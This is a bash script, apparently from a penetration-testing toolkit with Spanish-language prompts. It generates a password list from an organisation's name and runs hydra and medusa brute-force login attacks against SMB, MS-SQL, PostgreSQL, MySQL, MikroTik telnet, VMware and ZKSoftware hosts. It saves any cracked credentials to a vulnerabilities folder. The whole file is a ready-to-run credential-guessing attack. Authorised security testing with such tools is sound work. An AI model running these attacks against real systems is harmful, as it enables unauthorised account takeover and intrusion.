#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org

THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
                            



echo -e '  ______                  _                         __   ______ '
echo -e ' / _____)                | |                       /  | / __   |'
echo -e '| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |'
echo -e '| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |'
echo -e '| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |'
echo -e ' \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ '
echo ''
echo '									   daniel.torres@owasp.org'
															
echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"

echo -e "\n\t $OKBLUE Nombre de la entidad (una palabra)? $RESET"	  
read entidad	 

rm enumeration/* 2>/dev/null
rm vulnerabilities/* 2>/dev/null

echo $entidad > base.txt
passGen.sh -f base.txt -t top20 -o top.txt 
rm base.txt


if [ -f .services/Windows.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios SMB activos (Windows). Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	  if [ $bruteforce == 's' ]
      then 

	 echo -e "$OKBLUE\n\t#################### Windows auth ######################$RESET"	    
	 for ip in $(cat .services/Windows.txt); do		
		echo -e "\n\t########### $ip #######"							
		hydra -l administrador -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
		hydra -l administrator -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
		hydra -l soporte -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
		hydra -l $entidad -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null		
		grep --color=never 'password:' logs/cracking/$ip-windows.txt > vulnerabilities/$ip-windows-password.txt
		
	 done	
   fi # if bruteforce
fi



if [ -f .services/ZKSoftware.txt ]
then
      	  
	  echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
	  for ip in $(cat .services/ZKSoftware.txt); do
		echo -e "\n\t########### $ip #######"			
		passWeb.pl -t $ip -p 80 -s ZKSoftware -f top.txt > vulnerabilities/$ip-80-password.txt
		echo ""			
	 done	
fi


if [ -f .services/mssql.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios MS-SQL activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	  if [ $bruteforce == 's' ]
      then 

	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
	 for line in $(cat .services/mssql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "\n\t########### $ip #######"							
		medusa -e n -u sa -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
		medusa -e n -u $entidad -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
		
		grep --color=never SUCCESS logs/cracking/$ip-mssql.txt > vulnerabilities/$ip-mssql-password.txt
		
	 done	
   fi # if bruteforce
fi


if [ -f .services/postgres.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios postgres activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	  if [ $bruteforce == 's' ]
      then 

	 echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
	 for line in $(cat .services/postgres.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "\n\t########### $ip #######"							
		medusa -e n -u postgres -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
		medusa -e n -u $entidad -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
		
		grep --color=never SUCCESS logs/cracking/$ip-postgres.txt > vulnerabilities/$ip-postgres-password.txt
		
	 done	
   fi # if bruteforce
fi


if [ -f .services/MikroTik.txt ]
then
	echo -e "\n\t $OKBLUE Encontre dispositivos MikroTik. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
	  for ip in $(cat .services/MikroTik.txt); do		
		echo -e "\n\t########### $ip #######"			
		medusa -e n -u admin -P top.txt -h $ip -M telnet | tee -a  logs/cracking/$ip-MikroTik.txt		
		medusa -e n -u $entidad  -P top.txt -h $ip -M telnet | tee -a  logs/cracking/$ip-MikroTik.txt
		grep --color=never SUCCESS logs/cracking/$ip-MikroTik.txt > vulnerabilities/$ip-MikroTik-password.txt
		echo ""			
	 done
	fi # if bruteforce
fi

if [ -f .services/vmware.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de vmware activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
	  for line in $(cat .services/vmware.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		medusa -e n -u root -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt	
		medusa -e n -u $entidad  -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt
		grep --color=never SUCCESS logs/cracking/$ip-vmware.txt > vulnerabilities/$ip-vmware-password.txt
		echo ""			
	 done
	fi # if bruteforce
fi

if [ -f .services/mysql.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de MySQL activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
	  for line in $(cat .services/mysql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		medusa -e n -u root -P top.txt -h $ip -M mysql | tee -a  logs/cracking/$ip-mysql.txt
		medusa -e n -u mysql -P top.txt -h $ip -M mysql | tee -a  logs/cracking/$ip-mysql.txt
		medusa -e n -u $entidad  -P top.txt -h $ip -M mysql | tee -a  logs/cracking/$ip-mysql.txt
		grep --color=never SUCCESS logs/cracking/$ip-mysql.txt > vulnerabilities/$ip-mysql-password.txt
		echo ""			
	 done
	fi # if bruteforce
fi



insert-data.py




